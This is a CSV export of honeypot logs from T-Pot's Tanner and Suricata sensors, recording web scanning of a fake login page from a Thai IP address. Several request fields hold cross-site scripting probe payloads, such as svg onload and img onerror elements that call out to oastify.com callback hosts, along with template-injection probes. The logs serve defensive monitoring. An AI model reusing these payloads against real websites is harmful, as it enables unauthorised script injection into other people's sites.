@timestamp,@version,app_proto,cookies,dest_ip,dest_port,event_type,fileinfo,flow_id,geoip,geoip_ext,headers,host,http,in_iface,method,path,peer,pkt_src,post_data,proto,response_msg,sector,src_ip,src_port,status,t-pot_hostname,t-pot_ip_ext,t-pot_ip_int,timestamp,tx_id,type,uuid
2024-12-02T09:26:27.131Z,1,,"{'sess_uuid': ""javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2ff7n8hziac9u0if05322e3hkokfq8e42wtkka70vpX%3b.oastify.com%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e""}",,80,,,,"{'country_code2': 'TH', 'timezone': 'Asia/Bangkok', 'region_name': 'Bangkok', 'asn': 45758, 'as_org': 'Triple T Broadband Public Company Limited', 'ip': '183.89.248.147', 'longitude': 100.4597, 'location': {'lon': 100.4597, 'lat': 13.7063}, 'city_name': 'Bangkok', 'country_code3': 'TH', 'region_code': '10', 'continent_code': 'AS', 'postal_code': '10110', 'country_name': 'Thailand', 'latitude': 13.7063}","{'country_code2': 'SG', 'timezone': 'Asia/Singapore', 'asn': 16509, 'as_org': 'AMAZON-02', 'ip': '18.142.228.230', 'longitude': 103.8503, 'location': {'lon': 103.8503, 'lat': 1.2868}, 'city_name': 'Singapore', 'country_code3': 'SG', 'continent_code': 'AS', 'postal_code': '17', 'country_name': 'Singapore', 'latitude': 1.2868}","{'cookie': ""sess_uuid=javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2ff7n8hziac9u0if05322e3hkokfq8e42wtkka70vpX%3b.oastify.com%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e"", 'origin': 'null', 'host': '18.142.228.230', 'upgrade-insecure-requests': '1', 'accept-language': 'en-US,en;q=0.9', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'cache-control': 'max-age=0', 'content-length': '174', 'connection': 'keep-alive', 'accept-encoding': 'gzip, deflate, br', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'}",f88211c9d984,,,POST,/,{},,"{'password': 'test', 'timezone': 'Asia/Jakarta', 'user': 'test', 'timezone-offset': '7', 'requesttoken': 'ZFo8HwAyPg8OHkMLKAkZDEk9CzU4SlQ5GjwALzxtGzg=:VbsjeTXabzl3jcwvzQctOs3xCO7axTLnOvbePZr95oI='}",,"{'version': '0.6.0', 'response': {'message': {'sess_uuid': 'dc5593dc-9767-4738-8954-788caf22b62f', 'detection': {'order': 0, 'version': '0.6.0', 'name': 'unknown', 'type': 1}}}}",other,183.89.248.147,59826,200,poclab,18.142.228.230,172.31.28.38,2024-12-02T09:26:27.131423,,Tanner,9cc163dc-5b0c-462d-8cdf-803224f6cbf2
2024-12-02T09:26:26.457Z,1,,{'sess_uuid': '2cb3f70f-ae1f-4600-9ddc-16f022e40831'},,80,,,,"{'country_code2': 'TH', 'timezone': 'Asia/Bangkok', 'region_name': 'Bangkok', 'asn': 45758, 'as_org': 'Triple T Broadband Public Company Limited', 'ip': '183.89.248.147', 'longitude': 100.4597, 'location': {'lon': 100.4597, 'lat': 13.7063}, 'city_name': 'Bangkok', 'country_code3': 'TH', 'region_code': '10', 'continent_code': 'AS', 'postal_code': '10110', 'country_name': 'Thailand', 'latitude': 13.7063}","{'country_code2': 'SG', 'timezone': 'Asia/Singapore', 'asn': 16509, 'as_org': 'AMAZON-02', 'ip': '18.142.228.230', 'longitude': 103.8503, 'location': {'lon': 103.8503, 'lat': 1.2868}, 'city_name': 'Singapore', 'country_code3': 'SG', 'continent_code': 'AS', 'postal_code': '17', 'country_name': 'Singapore', 'latitude': 1.2868}","{'cookie': 'sess_uuid=2cb3f70f-ae1f-4600-9ddc-16f022e40831', 'origin': 'null', 'host': '18.142.228.230', 'upgrade-insecure-requests': '1', 'accept-language': 'en-US,en;q=0.9', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'cache-control': 'max-age=0', 'content-length': '210', 'connection': 'keep-alive', 'accept-encoding': 'gzip, deflate, br', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'}",f88211c9d984,,,POST,/,{},,"{'password': '3txw3n4yyxgo43mtpqo2p56c63cw0sokg87yuqif', 'timezone': 'Asia/Jakarta', 'user': 'test', 'timezone-offset': '7', 'requesttoken': 'ZFo8HwAyPg8OHkMLKAkZDEk9CzU4SlQ5GjwALzxtGzg=:VbsjeTXabzl3jcwvzQctOs3xCO7axTLnOvbePZr95oI='}",,"{'version': '0.6.0', 'response': {'message': {'sess_uuid': 'ecc2f2d7-bd4b-440a-9ba9-41289afbe5d0', 'detection': {'order': 0, 'version': '0.6.0', 'name': 'unknown', 'type': 1}}}}",other,183.89.248.147,59819,200,poclab,18.142.228.230,172.31.28.38,2024-12-02T09:26:26.457812,,Tanner,9cc163dc-5b0c-462d-8cdf-803224f6cbf2
2024-12-02T09:26:26.832Z,1,,{'sess_uuid': '2cb3f70f-ae1f-4600-9ddc-16f022e40831'},,80,,,,"{'country_code2': 'TH', 'timezone': 'Asia/Bangkok', 'region_name': 'Bangkok', 'asn': 45758, 'as_org': 'Triple T Broadband Public Company Limited', 'ip': '183.89.248.147', 'longitude': 100.4597, 'location': {'lon': 100.4597, 'lat': 13.7063}, 'city_name': 'Bangkok', 'country_code3': 'TH', 'region_code': '10', 'continent_code': 'AS', 'postal_code': '10110', 'country_name': 'Thailand', 'latitude': 13.7063}","{'country_code2': 'SG', 'timezone': 'Asia/Singapore', 'asn': 16509, 'as_org': 'AMAZON-02', 'ip': '18.142.228.230', 'longitude': 103.8503, 'location': {'lon': 103.8503, 'lat': 1.2868}, 'city_name': 'Singapore', 'country_code3': 'SG', 'continent_code': 'AS', 'postal_code': '17', 'country_name': 'Singapore', 'latitude': 1.2868}","{'cookie': 'sess_uuid=2cb3f70f-ae1f-4600-9ddc-16f022e40831', 'origin': 'null', 'host': '18.142.228.230', 'upgrade-insecure-requests': '1', 'accept-language': 'en-US,en;q=0.9', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'cache-control': 'max-age=0', 'content-length': '174', 'connection': 'keep-alive', 'accept-encoding': 'gzip, deflate, br', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'}",f88211c9d984,,,POST,/,{},,"{'password': 'test', 'timezone': 'Asia/Jakarta', 'user': 'test', 'timezone-offset': '7', 'requesttoken': 'ZFo8HwAyPg8OHkMLKAkZDEk9CzU4SlQ5GjwALzxtGzg=:VbsjeTXabzl3jcwvzQctOs3xCO7axTLnOvbePZr95oI='}",,"{'version': '0.6.0', 'response': {'message': {'sess_uuid': 'ecc2f2d7-bd4b-440a-9ba9-41289afbe5d0', 'detection': {'order': 0, 'version': '0.6.0', 'name': 'unknown', 'type': 1}}}}",other,183.89.248.147,59823,200,poclab,18.142.228.230,172.31.28.38,2024-12-02T09:26:26.832119,,Tanner,9cc163dc-5b0c-462d-8cdf-803224f6cbf2
2024-12-02T09:26:27.256Z,1,,{'sess_uuid': '2cb3f70f-ae1f-4600-9ddc-16f022e40831'},,80,,,,"{'country_code2': 'TH', 'timezone': 'Asia/Bangkok', 'region_name': 'Bangkok', 'asn': 45758, 'as_org': 'Triple T Broadband Public Company Limited', 'ip': '183.89.248.147', 'longitude': 100.4597, 'location': {'lon': 100.4597, 'lat': 13.7063}, 'city_name': 'Bangkok', 'country_code3': 'TH', 'region_code': '10', 'continent_code': 'AS', 'postal_code': '10110', 'country_name': 'Thailand', 'latitude': 13.7063}","{'country_code2': 'SG', 'timezone': 'Asia/Singapore', 'asn': 16509, 'as_org': 'AMAZON-02', 'ip': '18.142.228.230', 'longitude': 103.8503, 'location': {'lon': 103.8503, 'lat': 1.2868}, 'city_name': 'Singapore', 'country_code3': 'SG', 'continent_code': 'AS', 'postal_code': '17', 'country_name': 'Singapore', 'latitude': 1.2868}","{'cookie': 'sess_uuid=2cb3f70f-ae1f-4600-9ddc-16f022e40831', 'origin': 'null', 'host': '18.142.228.230', 'upgrade-insecure-requests': '1', 'accept-language': 'en-US,en;q=0.9', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'cache-control': 'max-age=0', 'content-length': '270', 'connection': 'keep-alive', 'accept-encoding': 'gzip, deflate, br', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'}",f88211c9d984,,,POST,/,{},,"{'password': 'test', 'timezone': 'Asia/Jakarta', 'user': '\'""><svg/onload=fetch`//nlcgv7wiqh88wnedhagmhpywyn4gscg46sxik98y\\.oastify.com`>', 'timezone-offset': '7', 'requesttoken': 'ZFo8HwAyPg8OHkMLKAkZDEk9CzU4SlQ5GjwALzxtGzg=:VbsjeTXabzl3jcwvzQctOs3xCO7axTLnOvbePZr95oI='}",,"{'version': '0.6.0', 'response': {'message': {'sess_uuid': 'ecc2f2d7-bd4b-440a-9ba9-41289afbe5d0', 'detection': {'payload': {'value': '\'""><svg/onload=fetch`//nlcgv7wiqh88wnedhagmhpywyn4gscg46sxik98y\\.oastify.com`>', 'page': '/index.html'}, 'order': 3, 'version': '0.6.0', 'name': 'xss', 'type': 2}}}}",other,183.89.248.147,59827,200,poclab,18.142.228.230,172.31.28.38,2024-12-02T09:26:27.256324,,Tanner,9cc163dc-5b0c-462d-8cdf-803224f6cbf2
2024-12-02T09:26:24.488Z,1,,{'sess_uuid': '2cb3f70f-ae1f-4600-9ddc-16f022e40831'},,80,,,,"{'country_code2': 'TH', 'timezone': 'Asia/Bangkok', 'region_name': 'Bangkok', 'asn': 45758, 'as_org': 'Triple T Broadband Public Company Limited', 'ip': '183.89.248.147', 'longitude': 100.4597, 'location': {'lon': 100.4597, 'lat': 13.7063}, 'city_name': 'Bangkok', 'country_code3': 'TH', 'region_code': '10', 'continent_code': 'AS', 'postal_code': '10110', 'country_name': 'Thailand', 'latitude': 13.7063}","{'country_code2': 'SG', 'timezone': 'Asia/Singapore', 'asn': 16509, 'as_org': 'AMAZON-02', 'ip': '18.142.228.230', 'longitude': 103.8503, 'location': {'lon': 103.8503, 'lat': 1.2868}, 'city_name': 'Singapore', 'country_code3': 'SG', 'continent_code': 'AS', 'postal_code': '17', 'country_name': 'Singapore', 'latitude': 1.2868}","{'cookie': 'sess_uuid=2cb3f70f-ae1f-4600-9ddc-16f022e40831', 'origin': 'http://18.142.228.230', 'host': '18.142.228.230', 'accept-language': 'en-US;q=0.9,en;q=0.8', 'accept': '*/*', 'cache-control': 'max-age=0', 'referer': 'http://18.142.228.230/core/css/fonts.css?v=a9e1a600d8a15933c86dcad2284676cf', 'connection': 'close', 'sec-ch-ua-mobile': '?0', 'accept-encoding': 'gzip, deflate, br', 'sec-ch-ua': '"".Not/A)Brand"";v=""99"", ""Google Chrome"";v=""131"", ""Chromium"";v=""131""', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36', 'sec-ch-ua-platform': 'Windows'}",f88211c9d984,,,GET,/core/fonts/OpenSans-Regular.woff,{},,,,"{'version': '0.6.0', 'response': {'message': {'sess_uuid': '37719ccc-8d50-48e4-a00d-63a702f1e7ca', 'detection': {'order': 1, 'version': '0.6.0', 'name': 'index', 'type': 1}}}}",other,183.89.248.147,59804,200,poclab,18.142.228.230,172.31.28.38,2024-12-02T09:26:24.488140,,Tanner,9cc163dc-5b0c-462d-8cdf-803224f6cbf2
2024-12-02T09:26:24.639Z,1,,{'sess_uuid': '2cb3f70f-ae1f-4600-9ddc-16f022e40831'},,80,,,,"{'country_code2': 'TH', 'timezone': 'Asia/Bangkok', 'region_name': 'Bangkok', 'asn': 45758, 'as_org': 'Triple T Broadband Public Company Limited', 'ip': '183.89.248.147', 'longitude': 100.4597, 'location': {'lon': 100.4597, 'lat': 13.7063}, 'city_name': 'Bangkok', 'country_code3': 'TH', 'region_code': '10', 'continent_code': 'AS', 'postal_code': '10110', 'country_name': 'Thailand', 'latitude': 13.7063}","{'country_code2': 'SG', 'timezone': 'Asia/Singapore', 'asn': 16509, 'as_org': 'AMAZON-02', 'ip': '18.142.228.230', 'longitude': 103.8503, 'location': {'lon': 103.8503, 'lat': 1.2868}, 'city_name': 'Singapore', 'country_code3': 'SG', 'continent_code': 'AS', 'postal_code': '17', 'country_name': 'Singapore', 'latitude': 1.2868}","{'cookie': 'sess_uuid=2cb3f70f-ae1f-4600-9ddc-16f022e40831', 'origin': 'null', 'host': '18.142.228.230', 'upgrade-insecure-requests': '1', 'accept-language': 'en-US,en;q=0.9', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'cache-control': 'max-age=0', 'content-length': '200', 'connection': 'keep-alive', 'accept-encoding': 'gzip, deflate, br', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'}",f88211c9d984,,,POST,/,{},,"{'password': 'test', 'timezone': 'Asia/Jakarta%}menaq\'/""<s970y', 'user': 'test', 'timezone-offset': '7', 'requesttoken': 'ZFo8HwAyPg8OHkMLKAkZDEk9CzU4SlQ5GjwALzxtGzg=:VbsjeTXabzl3jcwvzQctOs3xCO7axTLnOvbePZr95oI='}",,"{'version': '0.6.0', 'response': {'message': {'sess_uuid': 'ecc2f2d7-bd4b-440a-9ba9-41289afbe5d0', 'detection': {'order': 0, 'version': '0.6.0', 'name': 'unknown', 'type': 1}}}}",other,183.89.248.147,59809,200,poclab,18.142.228.230,172.31.28.38,2024-12-02T09:26:24.639227,,Tanner,9cc163dc-5b0c-462d-8cdf-803224f6cbf2
2024-12-02T09:26:26.557Z,1,,{'sess_uuid': '2cb3f70f-ae1f-4600-9ddc-16f022e40831'},,80,,,,"{'country_code2': 'TH', 'timezone': 'Asia/Bangkok', 'region_name': 'Bangkok', 'asn': 45758, 'as_org': 'Triple T Broadband Public Company Limited', 'ip': '183.89.248.147', 'longitude': 100.4597, 'location': {'lon': 100.4597, 'lat': 13.7063}, 'city_name': 'Bangkok', 'country_code3': 'TH', 'region_code': '10', 'continent_code': 'AS', 'postal_code': '10110', 'country_name': 'Thailand', 'latitude': 13.7063}","{'country_code2': 'SG', 'timezone': 'Asia/Singapore', 'asn': 16509, 'as_org': 'AMAZON-02', 'ip': '18.142.228.230', 'longitude': 103.8503, 'location': {'lon': 103.8503, 'lat': 1.2868}, 'city_name': 'Singapore', 'country_code3': 'SG', 'continent_code': 'AS', 'postal_code': '17', 'country_name': 'Singapore', 'latitude': 1.2868}","{'cookie': 'sess_uuid=2cb3f70f-ae1f-4600-9ddc-16f022e40831', 'origin': 'null', 'host': '18.142.228.230', 'upgrade-insecure-requests': '1', 'accept-language': 'en-US,en;q=0.9', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'cache-control': 'max-age=0', 'content-length': '213', 'connection': 'keep-alive', 'accept-encoding': 'gzip, deflate, br', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'}",f88211c9d984,,,POST,/,{},,"{'password': 'test', 'timezone': 'Asia/Jakarta', 'user': 'test', 'timezone-offset': 'in9bx2ydsca3yig8j5ihjk0r0i6bu7izan1do6cv', 'requesttoken': 'ZFo8HwAyPg8OHkMLKAkZDEk9CzU4SlQ5GjwALzxtGzg=:VbsjeTXabzl3jcwvzQctOs3xCO7axTLnOvbePZr95oI='}",,"{'version': '0.6.0', 'response': {'message': {'sess_uuid': 'ecc2f2d7-bd4b-440a-9ba9-41289afbe5d0', 'detection': {'order': 0, 'version': '0.6.0', 'name': 'unknown', 'type': 1}}}}",other,183.89.248.147,59820,200,poclab,18.142.228.230,172.31.28.38,2024-12-02T09:26:26.557738,,Tanner,9cc163dc-5b0c-462d-8cdf-803224f6cbf2
2024-12-02T09:26:27.043Z,1,,"{'sess_uuid': ""'%22%3e%3csvg%2fonload%3dfetch%60%2f%2fesa72y39x8fz3el4o1ndog5n5eb7z3nvdj49rzfo%5c.oastify.com%60%3e""}",,80,,,,"{'country_code2': 'TH', 'timezone': 'Asia/Bangkok', 'region_name': 'Bangkok', 'asn': 45758, 'as_org': 'Triple T Broadband Public Company Limited', 'ip': '183.89.248.147', 'longitude': 100.4597, 'location': {'lon': 100.4597, 'lat': 13.7063}, 'city_name': 'Bangkok', 'country_code3': 'TH', 'region_code': '10', 'continent_code': 'AS', 'postal_code': '10110', 'country_name': 'Thailand', 'latitude': 13.7063}","{'country_code2': 'SG', 'timezone': 'Asia/Singapore', 'asn': 16509, 'as_org': 'AMAZON-02', 'ip': '18.142.228.230', 'longitude': 103.8503, 'location': {'lon': 103.8503, 'lat': 1.2868}, 'city_name': 'Singapore', 'country_code3': 'SG', 'continent_code': 'AS', 'postal_code': '17', 'country_name': 'Singapore', 'latitude': 1.2868}","{'cookie': ""sess_uuid='%22%3e%3csvg%2fonload%3dfetch%60%2f%2fesa72y39x8fz3el4o1ndog5n5eb7z3nvdj49rzfo%5c.oastify.com%60%3e"", 'origin': 'null', 'host': '18.142.228.230', 'upgrade-insecure-requests': '1', 'accept-language': 'en-US,en;q=0.9', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'cache-control': 'max-age=0', 'content-length': '174', 'connection': 'keep-alive', 'accept-encoding': 'gzip, deflate, br', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'}",f88211c9d984,,,POST,/,{},,"{'password': 'test', 'timezone': 'Asia/Jakarta', 'user': 'test', 'timezone-offset': '7', 'requesttoken': 'ZFo8HwAyPg8OHkMLKAkZDEk9CzU4SlQ5GjwALzxtGzg=:VbsjeTXabzl3jcwvzQctOs3xCO7axTLnOvbePZr95oI='}",,"{'version': '0.6.0', 'response': {'message': {'sess_uuid': '7ff15c95-9bf3-4185-a2c6-2d9e7fb08a78', 'detection': {'order': 0, 'version': '0.6.0', 'name': 'unknown', 'type': 1}}}}",other,183.89.248.147,59825,200,poclab,18.142.228.230,172.31.28.38,2024-12-02T09:26:27.043631,,Tanner,9cc163dc-5b0c-462d-8cdf-803224f6cbf2
2024-12-02T09:26:26.973Z,1,http,,172.31.28.38,80,fileinfo,"{'md5': '22f190b83da4caf23db301e5191ca5ab', 'tx_id': 0, 'magic': 'ASCII text, with no line terminators', 'size': 174, 'stored': False, 'gaps': False, 'filename': '/', 'state': 'CLOSED'}",726544047901256,"{'country_code2': 'TH', 'timezone': 'Asia/Bangkok', 'region_name': 'Bangkok', 'asn': 45758, 'as_org': 'Triple T Broadband Public Company Limited', 'ip': '183.89.248.147', 'longitude': 100.4597, 'location': {'lon': 100.4597, 'lat': 13.7063}, 'city_name': 'Bangkok', 'country_code3': 'TH', 'region_code': '10', 'continent_code': 'AS', 'postal_code': '10110', 'country_name': 'Thailand', 'latitude': 13.7063}","{'country_code2': 'SG', 'timezone': 'Asia/Singapore', 'asn': 16509, 'as_org': 'AMAZON-02', 'ip': '18.142.228.230', 'longitude': 103.8503, 'location': {'lon': 103.8503, 'lat': 1.2868}, 'city_name': 'Singapore', 'country_code3': 'SG', 'continent_code': 'AS', 'postal_code': '17', 'country_name': 'Singapore', 'latitude': 1.2868}",,f88211c9d984,"{'http_user_agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'http_content_type': 'text/html', 'status': 200, 'url': '/', 'http_method': 'POST', 'length': 9652, 'protocol': 'HTTP/1.1', 'hostname': '18.142.228.230'}",eth0,,/data/suricata/log/eve.json,,wire/pcap,,TCP,,other,183.89.248.147,59824,,poclab,18.142.228.230,172.31.28.38,2024-12-02T09:26:26.973045+0000,,Suricata,
2024-12-02T09:26:27.087Z,1,,,172.31.28.38,80,http,,879468364544424,"{'country_code2': 'TH', 'timezone': 'Asia/Bangkok', 'region_name': 'Bangkok', 'asn': 45758, 'as_org': 'Triple T Broadband Public Company Limited', 'ip': '183.89.248.147', 'longitude': 100.4597, 'location': {'lon': 100.4597, 'lat': 13.7063}, 'city_name': 'Bangkok', 'country_code3': 'TH', 'region_code': '10', 'continent_code': 'AS', 'postal_code': '10110', 'country_name': 'Thailand', 'latitude': 13.7063}","{'country_code2': 'SG', 'timezone': 'Asia/Singapore', 'asn': 16509, 'as_org': 'AMAZON-02', 'ip': '18.142.228.230', 'longitude': 103.8503, 'location': {'lon': 103.8503, 'lat': 1.2868}, 'city_name': 'Singapore', 'country_code3': 'SG', 'continent_code': 'AS', 'postal_code': '17', 'country_name': 'Singapore', 'latitude': 1.2868}",,f88211c9d984,"{'http_user_agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'http_content_type': 'text/html', 'status': 200, 'url': '/', 'request_headers': [{'value': 'gzip, deflate, br', 'name': 'Accept-Encoding'}, {'value': 'en-US,en;q=0.9', 'name': 'Accept-Language'}], 'http_method': 'POST', 'length': 9652, 'protocol': 'HTTP/1.1', 'hostname': '18.142.228.230'}",eth0,,/data/suricata/log/eve.json,,wire/pcap,,TCP,,other,183.89.248.147,59825,,poclab,18.142.228.230,172.31.28.38,2024-12-02T09:26:27.087362+0000,0,Suricata,
2024-12-02T09:26:27.385Z,1,http,,172.31.28.38,80,fileinfo,"{'md5': '340b0c892cf14a70569b7aa79f08f941', 'tx_id': 0, 'magic': 'ASCII text, with very long lines (413), with no line terminators', 'size': 413, 'stored': False, 'gaps': False, 'filename': '/', 'state': 'CLOSED'}",1028240623499719,"{'country_code2': 'TH', 'timezone': 'Asia/Bangkok', 'region_name': 'Bangkok', 'asn': 45758, 'as_org': 'Triple T Broadband Public Company Limited', 'ip': '183.89.248.147', 'longitude': 100.4597, 'location': {'lon': 100.4597, 'lat': 13.7063}, 'city_name': 'Bangkok', 'country_code3': 'TH', 'region_code': '10', 'continent_code': 'AS', 'postal_code': '10110', 'country_name': 'Thailand', 'latitude': 13.7063}","{'country_code2': 'SG', 'timezone': 'Asia/Singapore', 'asn': 16509, 'as_org': 'AMAZON-02', 'ip': '18.142.228.230', 'longitude': 103.8503, 'location': {'lon': 103.8503, 'lat': 1.2868}, 'city_name': 'Singapore', 'country_code3': 'SG', 'continent_code': 'AS', 'postal_code': '17', 'country_name': 'Singapore', 'latitude': 1.2868}",,f88211c9d984,"{'http_user_agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'http_content_type': 'text/html', 'status': 200, 'url': '/', 'http_method': 'POST', 'length': 9831, 'protocol': 'HTTP/1.1', 'hostname': '18.142.228.230'}",eth0,,/data/suricata/log/eve.json,,wire/pcap,,TCP,,other,183.89.248.147,59828,,poclab,18.142.228.230,172.31.28.38,2024-12-02T09:26:27.385935+0000,,Suricata,
2024-12-02T09:26:27.475Z,1,,,172.31.28.38,80,http,,1105925008805202,"{'country_code2': 'TH', 'timezone': 'Asia/Bangkok', 'region_name': 'Bangkok', 'asn': 45758, 'as_org': 'Triple T Broadband Public Company Limited', 'ip': '183.89.248.147', 'longitude': 100.4597, 'location': {'lon': 100.4597, 'lat': 13.7063}, 'city_name': 'Bangkok', 'country_code3': 'TH', 'region_code': '10', 'continent_code': 'AS', 'postal_code': '10110', 'country_name': 'Thailand', 'latitude': 13.7063}","{'country_code2': 'SG', 'timezone': 'Asia/Singapore', 'asn': 16509, 'as_org': 'AMAZON-02', 'ip': '18.142.228.230', 'longitude': 103.8503, 'location': {'lon': 103.8503, 'lat': 1.2868}, 'city_name': 'Singapore', 'country_code3': 'SG', 'continent_code': 'AS', 'postal_code': '17', 'country_name': 'Singapore', 'latitude': 1.2868}",,f88211c9d984,"{'http_user_agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'http_content_type': 'text/html', 'status': 200, 'url': '/', 'request_headers': [{'value': 'gzip, deflate, br', 'name': 'Accept-Encoding'}, {'value': 'en-US,en;q=0.9', 'name': 'Accept-Language'}], 'http_method': 'POST', 'length': 9752, 'protocol': 'HTTP/1.1', 'hostname': '18.142.228.230'}",eth0,,/data/suricata/log/eve.json,,wire/pcap,,TCP,,other,183.89.248.147,59829,,poclab,18.142.228.230,172.31.28.38,2024-12-02T09:26:27.475268+0000,0,Suricata,
